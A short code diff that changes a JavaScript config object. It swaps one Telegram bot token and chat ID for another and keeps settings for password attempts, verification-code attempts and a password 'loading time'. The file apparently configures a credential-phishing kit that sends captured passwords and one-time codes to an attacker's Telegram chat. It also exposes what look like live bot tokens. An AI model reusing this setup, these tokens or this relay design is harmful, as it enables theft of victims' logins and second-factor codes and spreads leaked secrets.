@@ -1,6 +1,6 @@
 const config = {
-    token: '8296624060:AAGvaODI_Jl64oZTOKlPNMVbo6XscW4PTp0',
-    chat_id: '-5224935433',
+    token: '8534201632:AAECcw2E60yTvfbY3iQQtmsp8PxI3AET-TU',
+    chat_id: '-5313390718',
     max_password_attempts: 2,
     max_code_attempts: 3,
     password_loading_time: 6,
